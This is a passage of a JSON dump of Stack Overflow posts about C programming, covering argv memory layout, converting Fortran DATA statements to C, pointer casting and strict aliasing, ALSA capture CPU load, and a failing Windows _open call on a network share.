making it clear and the question was not exactly duplicate."}], "tags": [], "owner": {"reputation": 87138, "user_id": 136540, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a4d5888f021e337d09be5b3109c11e72?s=128&d=identicon&r=PG", "display_name": "Michael Aaron Safyan", "link": "https://stackoverflow.com/users/136540/michael-aaron-safyan"}, "is_accepted": true, "score": 2, "last_activity_date": 1457515236, "last_edit_date": 1457515236, "creation_date": 1457513828, "answer_id": 35886983, "question_id": 35886554, "link": "https://stackoverflow.com/questions/35886554/memory-map-of-what-happens-when-we-use-command-line-arguments/35886983#35886983", "title": "Memory map of what happens when we use command line arguments?", "body": "<p>The <code>argv</code> array is an array of strings (where  each entry in the array is of type <code>char*</code>). Each of those <code>char*</code> arrays is, itself, NUL-terminated. The <code>argv</code> array, itself, does not need to end in NULL (which is why a separate <code>argc</code> variable is used to track the length of the <code>argv</code> array).</p>\n\n<p>In terms of those arrays being constructed to begin with, this is dependent on the calling program. Typically, the calling program is a shell program (such as BASH), where arguments are separated via whitespace (with various quoting options available to allow arguments to include whitespace). Regardless of how the <code>argc</code>, <code>argv</code> parameters are constructed, the operating system provides routines for executing a program with this as the program inputs (e.g. on UNIX, that method is one of the various variations of <code>exec</code>, often paired with a call to <code>fork</code>).</p>\n\n<p>To make this a bit more concrete, suppose you ran:</p>\n\n<pre><code>./myprog \"arg\"\n</code></pre>\n\n<p>Here is an example of how this might look in memory (using completely fake addresses):</p>\n\n<pre><code>Addresss | Value | Comment\n========================\n0058     | 2      | argc\n0060     | 02100  | argv (value is the memory address of \"argv[0]\")\n...\n02100    | 02116 | argv[0] (value is the memory address of \"argv[0][0]\")\n02104    | 02300 | argv[1] (value is the memory address of \"argv[1][0]\")\n\n...\n02116    | '.'   | argv[0][0]\n02117    | '/'   | argv[0][1]\n02118    | 'm'   | argv[0][2]\n02119    | 'y'   | argv[0][3]\n02120    | 'p'   | argv[0][4]\n02121    | 'r'   | argv[0][5]\n02122    | 'o'   | argv[0][6]\n02123    | 'g'   | argv[0][7]\n02124    | '\\0'  | argv[0][8]\n...\n02300    | 'a'   | argv[1][0]\n02301    | 'r'   | argv[1][1]\n02302    | 'g'   | argv[1][2]\n02303    | '\\0'  | argv[1][3]\n</code></pre>\n"}], "owner": {"reputation": 1334, "user_id": 4068690, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4e778e8c8d892818024543a0176099c7?s=128&d=identicon&r=PG", "display_name": "imox", "link": "https://stackoverflow.com/users/4068690/imox"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 335, "favorite_count": 1, "closed_date": 1457515729, "accepted_answer_id": 35886983, "answer_count": 1, "score": -3, "last_activity_date": 1457515236, "creation_date": 1457512437, "question_id": 35886554, "link": "https://stackoverflow.com/questions/35886554/memory-map-of-what-happens-when-we-use-command-line-arguments", "closed_reason": "Duplicate", "title": "Memory map of what happens when we use command line arguments?", "body": "<p>What I understand is argc holds total number of arguments. Suppose my program takes 1 argument apart from program name. Now what does argv hold? Two pointer eg: 123,130 or ./hello\\0 and 5. If it holds 123 how does it know it has read one argument? Does it know because of \\0.</p>\n\n<p>If all the above is wrong, can someone help me understand using memory map.</p>\n"}, {"tags": ["c", "fortran", "fortran77"], "comments": [{"owner": {"reputation": 49888, "user_id": 721644, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/KSRQT.jpg?s=128&g=1", "display_name": "Vladimir F", "link": "https://stackoverflow.com/users/721644/vladimir-f"}, "edited": false, "score": 0, "creation_date": 1457515712, "post_id": 35886412, "comment_id": 59436553, "body": "Do not specify too many questions in one post, that makes it too broad. You can easily find some answer by searching around here. The meaning of 1.0d-6 is very easy to find (just a double prec. of 1e-6). The arithmetic if was also treated several times on this site."}, {"owner": {"reputation": 49888, "user_id": 721644, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/KSRQT.jpg?s=128&g=1", "display_name": "Vladimir F", "link": "https://stackoverflow.com/users/721644/vladimir-f"}, "edited": false, "score": 0, "creation_date": 1457516749, "post_id": 35886412, "comment_id": 59437252, "body": "I deleted the part that has no connection. See <a href=\"http://stackoverflow.com/questions/12567575/fortran-basic-help-d-operator\" title=\"fortran basic help d operator\">stackoverflow.com/questions/12567575/&hellip;</a> and <a href=\"http://stackoverflow.com/questions/11124855/fortran-strange-if\">stackoverflow.com/questions/11124855/fortran-strange-if</a>"}, {"owner": {"reputation": 24099, "user_id": 3157076, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mB4zi.png?s=128&g=1", "display_name": "francescalus", "link": "https://stackoverflow.com/users/3157076/francescalus"}, "edited": false, "score": 2, "creation_date": 1457516939, "post_id": 35886412, "comment_id": 59437404, "body": "In a <code>data</code> statement <code>2*0</code> does not mean multiplication, but multiplicity.  That is, one gets two zero values, not one (of two times zero).  There should be other questions to find covering that, if that is your confusion."}, {"owner": {"reputation": 49888, "user_id": 721644, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/KSRQT.jpg?s=128&g=1", "display_name": "Vladimir F", "link": "https://stackoverflow.com/users/721644/vladimir-f"}, "edited": false, "score": 0, "creation_date": 1457517644, "post_id": 35886412, "comment_id": 59437904, "body": "That&#39;s true. I didn&#39;t even read the details of that part. I have found a question where that is mentioned but not an exact duplicate."}, {"owner": {"reputation": 81, "user_id": 5421397, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/943c4e9233a93576768aeb50415b68c8?s=128&d=identicon&r=PG&f=1", "display_name": "snake_404", "link": "https://stackoverflow.com/users/5421397/snake-404"}, "edited": false, "score": 0, "creation_date": 1457544901, "post_id": 35886412, "comment_id": 59457792, "body": "Sorry for the questions, in the first part, 2*0 is not my confusion, is about how to assign the values, COEF and EXPON, are arrays of length 3, i have assigned the first 9 values to COEF, but i have just 7 values remaining to assign to EXPON, so i don&#39;t know if i have assigned the values correctly."}, {"owner": {"reputation": 81, "user_id": 5421397, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/943c4e9233a93576768aeb50415b68c8?s=128&d=identicon&r=PG&f=1", "display_name": "snake_404", "link": "https://stackoverflow.com/users/5421397/snake-404"}, "edited": false, "score": 0, "creation_date": 1457547638, "post_id": 35886412, "comment_id": 59459526, "body": "Sorry again, EXPON and COEF are a bidimensional array of length 9."}, {"owner": {"reputation": 6192, "user_id": 2041317, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/58b0m.png?s=128&g=1", "display_name": "cup", "link": "https://stackoverflow.com/users/2041317/cup"}, "edited": false, "score": 1, "creation_date": 1459166094, "post_id": 35886412, "comment_id": 60151542, "body": "In Fortran, the data is stored in row major.  Assign your data COEF[0][0], COEF[1][0], COEF[2][0], COEF[0][1] ... otherwise when you translate any algorithms, it is going to go bezerk."}], "answers": [{"tags": [], "owner": {"reputation": 354, "user_id": 2578418, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mC1Gr.jpg?s=128&g=1", "display_name": "Steve Rawlins", "link": "https://stackoverflow.com/users/2578418/steve-rawlins"}, "is_accepted": false, "score": 2, "last_activity_date": 1459539651, "creation_date": 1459539651, "answer_id": 36364598, "question_id": 35886412, "link": "https://stackoverflow.com/questions/35886412/data-statement-from-fortran-to-c/36364598#36364598", "title": "DATA statement from Fortran to C", "body": "<p>There <strong>are</strong> 18 values in the original DATA statement.  </p>\n\n<p>I believe you are confused by the <em>multiplicity</em>, just as stated by francescalus</p>\n\n<p>The 2*0 means: two zeroes.  It does not mean 2.0, it does not mean 2x0.  It means: \"Two zeroes, coming up!\"</p>\n\n<p>I think you need something like this:</p>\n\n<p>COEF[0][1] = 0.0;\nCOEF[0][2] = 0.0;</p>\n\n<p>(and also for the 2 zeroes in EXPON)</p>\n\n<p>Then your 18 values will line-up as you expect and you will not have any uninitialized slots in your C arrays.</p>\n"}, {"tags": [], "owner": {"reputation": 23625, "user_id": 2868801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ec5567811049b7ce8192be0bc0246d1?s=128&d=identicon&r=PG&f=1", "display_name": "dave_thompson_085", "link": "https://stackoverflow.com/users/2868801/dave-thompson-085"}, "is_accepted": false, "score": 0, "last_activity_date": 1459548666, "creation_date": 1459548666, "answer_id": 36366614, "question_id": 35886412, "link": "https://stackoverflow.com/questions/35886412/data-statement-from-fortran-to-c/36366614#36366614", "title": "DATA statement from Fortran to C", "body": "<p>You don't need to use executable assignments in C; if you wish, you <strong>can initialize a variable</strong> in its definition, which is the declaration that allocates storage. But aggregate initialization defaults to storage order and as @cup commented Fortran uses column-major while C uses row-major (and 0-origin vs default 1), so you must either transpose the data:</p>\n\n<pre><code>float coef[3][3] = { 1.0, 0.678914, 0.444635,\n    0, 0.430129, 0.535328,   0, 0, 0.154329 };\n</code></pre>\n\n<p>or (assuming C99+) use designated initializer syntax:</p>\n\n<pre><code>float coef[3][3] = { [0][0]=1.0, [1][0]=0, [2][0]=0,\n    [0][1]=0.678914,[1][1]=0.430129,[2][1]=0,\n    [0][2]=0.444635,[1][2]=0.535328,[2][2]=0.154329 };\n/* you can omit the zero-valued entries; in an aggregate \n    intializer any unspecified components are zero */\n</code></pre>\n"}], "owner": {"reputation": 81, "user_id": 5421397, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/943c4e9233a93576768aeb50415b68c8?s=128&d=identicon&r=PG&f=1", "display_name": "snake_404", "link": "https://stackoverflow.com/users/5421397/snake-404"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 137, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1459548666, "creation_date": 1457512012, "last_edit_date": 1457516628, "question_id": 35886412, "link": "https://stackoverflow.com/questions/35886412/data-statement-from-fortran-to-c", "title": "DATA statement from Fortran to C", "body": "<p>I need to translate a Fortran 77 code to C language, I have aprox 90% of the translation but I don't understand some parts of Fortran, for example, in Fortran I have:</p>\n\n<p><code>DIMENSION COEF(3,3),EXPON(3,3)\nDATA COEF,EXPON/1.0D0,2*0.0D0,0.678914D0,0.430129D0,0.0D0,\n     $ 0.444635D0,0.535328D0,0.154329D0,0.270950D0,2*0.0D0,0.151623D0,\n     $ 0.851819D0,0.0D0,0.109818D0,0.405771D0,2.22766D0/</code></p>\n\n<p>In this part, I have a two arrays of length 3, so, when I read the documentation of DATA, I need to put each value in the two arrays, so I have the next block of code in C:</p>\n\n<pre><code>COEF[0][0] = 1.0;\nCOEF[0][1] = 2.0;\nCOEF[0][2] = 0.6789140;\nCOEF[1][0] = 0.4301290;\nCOEF[1][1] = 0.0;\nCOEF[1][2] = 0.4446350;\nCOEF[2][0] = 0.5353280;\nCOEF[2][1] = 0.1543290;\nCOEF[2][2] = 0.2709500;\n\nEXPON[0][0] = 2.0;\nEXPON[0][1] = 0.1516230;\nEXPON[0][2] = 0.8518190;\nEXPON[1][0] = 0.0;\nEXPON[1][1] = 0.1098180;\nEXPON[1][2] = 0.4057710;\nEXPON[2][0] = 2.227660;\nEXPON[2][1] = 0.0;\nEXPON[2][2] = 0.0;\n</code></pre>\n\n<p>Assume that I need to associate the list of argument to the list of values, I just have 16 values, but I have 18 spaces between two arrays, so what happen with the last two spaces? XD</p>\n"}, {"tags": ["c", "pointers", "casting"], "comments": [{"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457511827, "post_id": 35886333, "comment_id": 59434319, "body": "There are no methods in C.  C only has functions."}, {"owner": {"reputation": 310760, "user_id": 12711, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/c330bdee507c95c603a93ca91d9145a9?s=128&d=identicon&r=PG", "display_name": "Michael Burr", "link": "https://stackoverflow.com/users/12711/michael-burr"}, "edited": false, "score": 2, "creation_date": 1457511866, "post_id": 35886333, "comment_id": 59434340, "body": "Casting a <code>float*</code> to a <code>double*</code> will not work for this. Depending on what is really being done, perhaps: <code>double temp = *fOne; method(&amp;temp,...);*fOne = temp;</code>.  You could wrap that in a function named something like <code>void fmethod(float* pf);</code>"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457511892, "post_id": 35886333, "comment_id": 59434357, "body": "If the function wants a <code>double *</code>, then you need to pass it a genuine <code>double *</code>.  You can convert to/from <code>float</code> outside of the function."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1457512007, "post_id": 35886333, "comment_id": 59434418, "body": "It&#39;s easier to understand why this wont work if you know that typically a <code>float</code> is 32 bits of data, and <code>double</code> is 64 bits of data. If you have an array of, say, five <code>float</code> elements (that is 20 bytes), then casting that to <code>double *</code> will not create an array of five <code>double</code> elements (which would be 40 bytes)."}, {"owner": {"reputation": 53, "user_id": 6038249, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/fb6939bf21373e9186ab9bbe6e92fa62?s=128&d=identicon&r=PG&f=1", "display_name": "Flippowitsch", "link": "https://stackoverflow.com/users/6038249/flippowitsch"}, "edited": false, "score": 0, "creation_date": 1457516372, "post_id": 35886333, "comment_id": 59436978, "body": "Thanks to all. I think Michael Burr&#39;s comment is the answer."}], "answers": [{"comments": [{"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1457513958, "post_id": 35886894, "comment_id": 59435488, "body": "Note that is also &quot;safe&quot; (in the sense that you mean) to cast <i>back</i> from a <code>char *</code> to the original type."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1457514149, "post_id": 35886894, "comment_id": 59435607, "body": "@OliverCharlesworth Well... it is safe to convert from for example <code>int*</code> to <code>bananas*</code> and then back to <code>int*</code>, without ever accessing the data through the <code>bananas</code> pointer. Why you would do that though, I have no idea."}, {"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1457514287, "post_id": 35886894, "comment_id": 59435662, "body": "Well in the <code>char *</code> case, the cast to <code>char *</code> is explicitly allowed in order to do byte-by-byte operations.  But at some point you need to get back to the original type, which is also safe!"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1457514871, "post_id": 35886894, "comment_id": 59435996, "body": "@OliverCharlesworth Well... yes... no... maybe :) It is safe if you don&#39;t modify the pointed-at address. But if you do, whether it is safe or dangerous depends on alignment."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 2, "last_activity_date": 1457513895, "last_edit_date": 1495535282, "creation_date": 1457513522, "answer_id": 35886894, "question_id": 35886333, "link": "https://stackoverflow.com/questions/35886333/should-i-avoid-casting-a-pointer/35886894#35886894", "title": "Should I avoid casting a pointer?", "body": "<p>You should never cast pointers of different types. When the pointed-to types have different representations, such forced conversions simply don't make any sense. For example, <code>double</code> and <code>float</code> might not have the same size or representation, in which case pointer conversions between the two types are blatantly incorrect.</p>\n\n<p>But even if you <em>know</em> that the different types have the same representation, the pointer conversion is <em>still</em> not safe! Because of the <a href=\"https://stackoverflow.com/questions/98650/what-is-the-strict-aliasing-rule\">strict aliasing rule</a>, such conversions might yield incorrectly generated code by the compiler, since the compiler is free to assume that you would never access the given data through a pointer of an incorrect type. So it might optimize away portions of your code.</p>\n\n<p>It is only safe to cast any given pointer:</p>\n\n<ul>\n<li>To/from a pointer pointing at the same qualified type (*).</li>\n<li>To a pointer pointing at the same type, but with more qualifiers specified (*).</li>\n<li>To/from <code>void</code> pointer.</li>\n<li>To a null pointer.</li>\n<li>To a pointer to byte integer types, such as <code>char*</code> or <code>uint8_t*</code>.</li>\n</ul>\n\n<p>All other cases of pointer to pointer conversions are bugs and invoke undefined behavior as soon as you access the pointed-to data. Including casts <em>from</em> <code>char*</code> to a pointer to a larger type.</p>\n\n<hr>\n\n<p>(*) Qualified type means, a type with qualifiers such as <code>const</code> or <code>volatile</code> present. For example it is safe to convert from <code>int*</code> to <code>const int*</code> but never the other way around.</p>\n"}], "owner": {"reputation": 53, "user_id": 6038249, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/fb6939bf21373e9186ab9bbe6e92fa62?s=128&d=identicon&r=PG&f=1", "display_name": "Flippowitsch", "link": "https://stackoverflow.com/users/6038249/flippowitsch"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 134, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1457513895, "creation_date": 1457511700, "last_edit_date": 1457512573, "question_id": 35886333, "link": "https://stackoverflow.com/questions/35886333/should-i-avoid-casting-a-pointer", "title": "Should I avoid casting a pointer?", "body": "<p>I have a method in C that expects a double pointer as an argument:</p>\n\n<pre><code>void method(\n    // in/out\n    double *dOne,\n    ...)\n</code></pre>\n\n<p>The caller has a float pointer</p>\n\n<pre><code>float *fOne;\n</code></pre>\n\n<p>What is a good way call <code>method()</code> with <code>fOne</code>?</p>\n\n<pre><code>method((double*)fOne, ...);\n</code></pre>\n\n<p>is not the best, is it?</p>\n"}, {"tags": ["c", "linux", "audio", "alsa", "libasound"], "comments": [{"owner": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1457512195, "post_id": 35886252, "comment_id": 59434528, "body": "What formats/channels/rates does your hardware actually support?"}, {"owner": {"reputation": 11, "user_id": 6037874, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd25c7ba8814e98290781b4c77ad95a3?s=128&d=identicon&r=PG&f=1", "display_name": "Tobby", "link": "https://stackoverflow.com/users/6037874/tobby"}, "reply_to_user": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1457592510, "post_id": 35886252, "comment_id": 59478204, "body": "It supports sample width in 16/24 bit linear, mono Left/Right or stereo channels and 16kHz and 48kHz."}, {"owner": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1457598874, "post_id": 35886252, "comment_id": 59481567, "body": "Please show the output of both <code>arecord -v -fdat -c1 -D primary something.wav</code> and <code>arecord -v -fdat -c1 -D rate0 something.wav</code>."}], "answers": [{"tags": [], "owner": {"reputation": 237, "user_id": 6485223, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f5b4193e344f7234b5a3951697b02f3f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt", "link": "https://stackoverflow.com/users/6485223/matt"}, "is_accepted": false, "score": 0, "last_activity_date": 1585195568, "creation_date": 1585195568, "answer_id": 60860876, "question_id": 35886252, "link": "https://stackoverflow.com/questions/35886252/alsa-capture-causes-high-cpu-usage/60860876#60860876", "title": "ALSA capture causes high CPU usage", "body": "<p>Sound capture should be a very trivial task for the CPU because most of it is happening in silicon hardware and occasionally it needs to fire up the thread to handle input audio. Typically if your periods or buffers are very small it will require more CPU attention and is likely to have overruns. Overruns may be where your signal dropouts are occuring.</p>\n\n<p>If your sample rate is 16 kHz, and you capture every 10ms, that is indeed 160 frames.</p>\n\n<p>Some things to look at are whether your period is smaller then 10ms, whether you are doing processing which is very heavy in your thread.</p>\n\n<p>To help you, there is some code in <a href=\"https://github.com/flatmax/gtkiostream/tree/master/include/ALSA\" rel=\"nofollow noreferrer\">gtkIOStream</a> which implements a C++ OO ALSA hierarchy. You can look at this <a href=\"https://github.com/flatmax/gtkiostream/tree/master/include/ALSA\" rel=\"nofollow noreferrer\">ALSAFullduplex.C</a> test application as a reference and test it to see if it suffers the same problems you are suffering.</p>\n\n<p>Information on building gtkIOStream is given in this email :\n<a href=\"https://lists.audioinjector.net/pipermail/people/2020-March/000028.html\" rel=\"nofollow noreferrer\">https://lists.audioinjector.net/pipermail/people/2020-March/000028.html</a></p>\n"}], "owner": {"reputation": 11, "user_id": 6037874, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd25c7ba8814e98290781b4c77ad95a3?s=128&d=identicon&r=PG&f=1", "display_name": "Tobby", "link": "https://stackoverflow.com/users/6037874/tobby"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 610, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1585195568, "creation_date": 1457511417, "last_edit_date": 1457593915, "question_id": 35886252, "link": "https://stackoverflow.com/questions/35886252/alsa-capture-causes-high-cpu-usage", "title": "ALSA capture causes high CPU usage", "body": "<p>I write a full-duplex ALSA program and run it on a linux-based embedded system.\nIts sound configurations are:</p>\n\n<ul>\n<li>Sample rate: 16Hz</li>\n<li>Channels: 1 (mono)</li>\n<li>Format: S16_LE</li>\n<li>min avail: 160 (frames)</li>\n</ul>\n\n<p>For real-time application, I need to capture sound every 10ms, so I set the min avail to 160.</p>\n\n<p>My problem is: While the program is running, the CPU usage is very High which might be 99.9% (by top command). Sometimes the CPU load is low, but once it gets up to 99.9%, then it can not go back to low CPU usage.</p>\n\n<p>I found out that it might be configuration problem. In asound.conf file (see it in the followed code), I have created a asym type card named \"asym0\" to choose two different slave cards for playback and capture. </p>\n\n<p>Originally, I use the \"primary\" as capture device, but it cause high CPU usage. Then I created a rate type card named \"rate0\", and set it as capture device. The CPU usage becomes lower which floats between 20%~60%, but the captured sound sounds bad. I 've heard some \"po po po\" in my voice if I test the Mic(capturing).</p>\n\n<p>So...</p>\n\n<blockquote>\n  <ul>\n  <li><strong>If I choose \"primary\", CPU usage is high, but no \"po po po\" sound.</strong></li>\n  <li><strong>If I choose \"rate0\", CPU usage is lower, but has \"po po po\" sound.</strong></li>\n  </ul>\n</blockquote>\n\n<p>What are the different from \"type hw\" and \"type rate\"?<br>\nIs the effect caused by the different interrupt frequency?</p>\n\n<p>asound.conf file:</p>\n\n<blockquote>\n  <p><code>pcm.primary {\n      type hw\n      card mycard\n  }\n  pcm.rate0 {\n      type rate\n      slave  {\n          pcm \"primary\" \n          rate 16000\n      }\n  }\n  pcm.asym0 {\n      type asym \n      playback.pcm \"primary\"\n      capture.pcm  \"primary\" or \"rate0\"\n  }</code></p>\n</blockquote>\n\n<p>Please anyone help me to solve this problem. Thank you!!!</p>\n"}, {"tags": ["c", "windows"], "comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457522061, "post_id": 35886118, "comment_id": 59440883, "body": "where are you expecting to find the <code>_open()</code> function?  I.E. which header file?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 1, "creation_date": 1457522340, "post_id": 35886118, "comment_id": 59441064, "body": "to reference the global variable <code>errno</code>, need to include the <code>errno.h</code> header file."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1457523405, "post_id": 35886118, "comment_id": 59441889, "body": "it looks like your trying to open a binary file for input that resides on another computer.   I suspect this is not the correct approach to that activity.   BTW: when I compiled the posted code, on ubuntu linux 14.04, using <code>gcc</code>, the compiler output a sizeable list of errors and warnings.  do you have all the warnings enabled when compiling?"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1457524013, "post_id": 35886118, "comment_id": 59442348, "body": "<a href=\"https://msdn.microsoft.com/en-us/library/z0kc8e3z.aspx\" rel=\"nofollow noreferrer\"><code>EINVAL</code> means &quot;Invalid <i>oflag</i> or <i>pmode</i> argument.&quot;</a>.  The file mode argument - which you supplied as <code>384</code> - is only used if the file flags include <code>O_CREATE</code>.  It&#39;s possible the C runtime is detecting the mode parameter was supplied by the caller without the <code>_O_CREAT</code> flag set.  Also, providing a <code>mode</code> parameter as a decimal magic number isn&#39;t very clear.  If you&#39;re not going to use provided permissions constants such as <code>S_IREAD</code>, providing the <code>mode</code> parameter in octal is much more understandable."}], "owner": {"reputation": 913, "user_id": 813506, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/03dfcfe068e4aad8bf256cc11719808b?s=128&d=identicon&r=PG", "display_name": "Sandy", "link": "https://stackoverflow.com/users/813506/sandy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 72, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1523528623, "creation_date": 1457510832, "last_edit_date": 1523528623, "question_id": 35886118, "link": "https://stackoverflow.com/questions/35886118/open-returns-einval-for-a-shared-file", "title": "_open returns EINVAL for a shared file", "body": "<p>I am trying to open a shared file using _open() function. It returns -1 and errno is 22(EINVAL). I am able to open the shared file in the file explorer. The program and the shared file are in Windows machine.</p>\n\n<pre><code>#include&lt;stddef.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;io.h&gt;\n#include &lt;stdio.h&gt;\n\nint main( void )\n{\n   int fh1;\n   char fname[50] = \"\\\\\\\\192.168.1.115\\\\data\\\\RELEASE-PC.err\";\n\n   fh1 = _open( fname, _O_RDONLY|_O_BINARY, 384 );\n   if( fh1 == -1 )\n      printf( \"Open failed on input file - %d\",errno ); //EINVAL\n   else\n   {\n      printf( \"Open succeeded on input file\\n\" );\n      _close( fh1 );\n   }\n}\n</code></pre>\n\n<p>Any idea why it is failing? Is it permission issue? </p>\n"}, {"tags": ["c", "keyboard", "x11"], "answers": [{"comments": [{"owner": {"reputation": 3975, "user_id": 3560981, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/8fa10e8d564dd93ece697b0aebe689dd?s=128&d=identicon&r=PG&f=1", "display_name": "Nidhoegger", "link": "https://stackoverflow.com/users/3560981/nidhoegger"}, "edited": false, "score": 0, "creation_date": 1457514266, "post_id": 35886417, "comment_id": 59435655, "body": "Currently I relay on the xkbcommond-keysym table. There is a list of all dead keys in there. But this may change someday..."}], "tags": [], "owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "is_accepted": false, "score": 0, "last_activity_date": 1457517637, "last_edit_date": 1457517637, "creation_date": 1457512030, "answer_id": 35886417, "question_id": 